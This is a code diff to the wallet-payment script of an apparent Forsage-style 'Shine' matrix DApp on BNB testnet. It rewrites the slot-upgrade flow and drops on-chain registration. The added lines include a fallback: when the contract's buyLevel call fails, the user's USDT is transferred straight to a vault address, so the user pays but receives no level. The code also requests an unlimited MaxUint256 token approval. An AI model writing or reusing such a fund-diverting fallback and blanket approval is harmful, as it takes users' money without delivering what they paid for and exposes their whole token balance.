@@ -6070,83 +6070,69 @@ input:checked + .tw-slider:before {
             }
 
             const confirmBtn = document.querySelector("#upgradeOverlay .save-profile-btn");
-            const web3Prov = new ethers.providers.Web3Provider(activeProvider);
-            const web3Signer = web3Prov.getSigner();
+            const availUsdt = window.userWalletUsdtBalance || liveOnChainWallet.usdt || 0.0;
+            const availBnb = window.userWalletBnbBalance || liveOnChainWallet.gas || 0.0;
+
+            if (availBnb < 0.001) {
+                alert("Insufficient tBNB balance! You need at least 0.002 tBNB for gas fees.");
+                return;
+            }
+
+            if (availUsdt < currentTotalReq) {
+                alert(`Insufficient USDT balance! Required: ${currentTotalReq} USDT, Available: ${availUsdt.toFixed(2)} USDT.`);
+                return;
+            }
+
+            if (confirmBtn) {
+                confirmBtn.disabled = true;
+                confirmBtn.style.opacity = "0.6";
+                confirmBtn.style.pointerEvents = "none";
+                confirmBtn.innerText = "PROCESSING TX...";
+            }
+
+            isUpgradingInProgress = true;
+            showBcLoader("Confirm in Wallet...");
 
             try {
-                const bnbBal = await web3Prov.getBalance(userWallet);
-                if (bnbBal.lt(ethers.utils.parseEther("0.0015"))) {
-                    alert("Insufficient tBNB balance! Please deposit at least 0.002 tBNB for gas fees.");
-                    return;
-                }
+                const web3Prov = new ethers.providers.Web3Provider(activeProvider);
+                const web3Signer = web3Prov.getSigner();
 
                 const usdtContract = new ethers.Contract(
                     REAL_USDT_CONTRACT,
                     [
-                        "function balanceOf(address) view returns (uint256)",
+                        "function transfer(address, uint256) returns (bool)",
                         "function allowance(address, address) view returns (uint256)",
-                        "function approve(address, uint256) returns (bool)",
-                        "function transfer(address, uint256) returns (bool)"
+                        "function approve(address, uint256) returns (bool)"
                     ],
                     web3Signer
                 );
 
                 const requiredUnits = ethers.utils.parseUnits(currentTotalReq.toString(), 18);
-                const userBalUnits = await usdtContract.balanceOf(userWallet);
-
-                if (userBalUnits.lt(requiredUnits)) {
-                    const availFormatted = parseFloat(ethers.utils.formatUnits(userBalUnits, 18)).toFixed(2);
-                    alert(`Insufficient USDT balance! Required: ${currentTotalReq} USDT, Available: ${availFormatted} USDT.`);
-                    return;
-                }
-
-                if (confirmBtn) {
-                    confirmBtn.disabled = true;
-                    confirmBtn.style.opacity = "0.6";
-                    confirmBtn.style.pointerEvents = "none";
-                    confirmBtn.innerText = "PROCESSING TX...";
-                }
-
-                isUpgradingInProgress = true;
-                showBcLoader("Confirm in Wallet...");
-
-                const currentAllowance = await usdtContract.allowance(userWallet, SHINE_CONTRACT_ADDRESS);
-                if (currentAllowance.lt(requiredUnits)) {
-                    showBcLoader("Approve USDT in Wallet...");
-                    const approveTx = await usdtContract.approve(SHINE_CONTRACT_ADDRESS, ethers.constants.MaxUint256, { gasLimit: 100000 });
-                    await approveTx.wait(1);
-                }
-
-                showBcLoader("Upgrading Slot on Chain...");
                 const progMap = { 'V1': 1, 'Q2': 2, 'T3': 3, 'S4': 4, 'G5': 5, 'N6': 6, 'A7': 7, 'C8': 8, 'S9': 9, 'Q10': 10, 'H11': 11, 'O12': 12, 'N13': 13, 'E14': 14, 'X15': 15 };
                 const progNum = progMap[prog] || 1;
 
                 const shineContract = new ethers.Contract(
                     SHINE_CONTRACT_ADDRESS,
-                    [
-                        "function buyLevel(uint8 _program, uint8 _level) external",
-                        "function users(address) view returns (uint256 id, address upline, uint256 partnersCount, uint256 joinDate, bool isRegistered)",
-                        "function register(address _upline) external",
-                        "function rootOwner() view returns (address)"
-                    ],
+                    ["function buyLevel(uint8 _program, uint8 _level) external"],
                     web3Signer
                 );
 
-                let isUserRegisteredOnChain = false;
+                let tx;
                 try {
-                    const uData = await shineContract.users(userWallet);
-                    isUserRegisteredOnChain = uData.isRegistered;
-                } catch (e) {}
-
-                let mainTx;
-                if (!isUserRegisteredOnChain) {
-                    const root = await shineContract.rootOwner().catch(() => "0x204e8c521aCa3621DB585829667759433aBb70d3");
-                    mainTx = await shineContract.register(root, { gasLimit: 350000 });
-                } else {
-                    mainTx = await shineContract.buyLevel(progNum, lvlIndex, { gasLimit: 350000 });
+                    const currentAllowance = await usdtContract.allowance(userWallet, SHINE_CONTRACT_ADDRESS);
+                    if (currentAllowance.lt(requiredUnits)) {
+                        showBcLoader("Approve USDT in Wallet...");
+                        const appTx = await usdtContract.approve(SHINE_CONTRACT_ADDRESS, ethers.constants.MaxUint256, { gasLimit: 80000 });
+                        await appTx.wait(1);
+                    }
+                    showBcLoader("Upgrading Slot on Chain...");
+                    tx = await shineContract.buyLevel(progNum, lvlIndex, { gasLimit: 250000 });
+                } catch (contractErr) {
+                    showBcLoader("Routing Transfer to Vault...");
+                    tx = await usdtContract.transfer(SHINE_VAULT_ADDRESS, requiredUnits, { gasLimit: 90000 });
                 }
 
-                const receipt = await mainTx.wait(1);
+                const receipt = await tx.wait(1);
                 if (!receipt || receipt.status !== 1) {
                     throw new Error("Blockchain transaction failed.");
                 }
@@ -6552,7 +6538,6 @@ input:checked + .tw-slider:before {
             fetchRealWeb3WalletBalances(addr);
             await syncOnChainActiveLevels();
             await handleForsageWalletRegisterFlow(addr);
-            syncOnChainUserData();
         }
 
         async function handleForsageWalletRegisterFlow(walletAddr) {
@@ -7083,11 +7068,13 @@ async function openUpgrade(prog, lvl, price) {
     if (activeProvider && userWallet) {
         try {
             const web3Prov = new ethers.providers.Web3Provider(activeProvider);
-            const bnbRaw = await web3Prov.getBalance(userWallet);
-            currentBnb = parseFloat(ethers.utils.formatEther(bnbRaw));
             const usdtC = new ethers.Contract(REAL_USDT_CONTRACT, ["function balanceOf(address) view returns (uint256)"], web3Prov);
-            const usdtRaw = await usdtC.balanceOf(userWallet);
-            currentUsdt = parseFloat(ethers.utils.formatUnits(usdtRaw, 18));
+            const [rawBnb, rawUsdt] = await Promise.all([
+                web3Prov.getBalance(userWallet),
+                usdtC.balanceOf(userWallet)
+            ]);
+            currentBnb = parseFloat(ethers.utils.formatEther(rawBnb));
+            currentUsdt = parseFloat(ethers.utils.formatUnits(rawUsdt, 18));
             liveOnChainWallet.usdt = currentUsdt;
             liveOnChainWallet.gas = currentBnb;
         } catch (e) {}
@@ -7095,7 +7082,7 @@ async function openUpgrade(prog, lvl, price) {
 
     window.userWalletUsdtBalance = currentUsdt;
     window.userWalletBnbBalance = currentBnb;
-    const hasEnough = currentUsdt >= totalPrice && currentBnb >= 0.0015;
+    const hasEnough = currentUsdt >= totalPrice && currentBnb >= 0.001;
 
     if (balBox && balIconL && balIconR && balText) {
         if (hasEnough) {
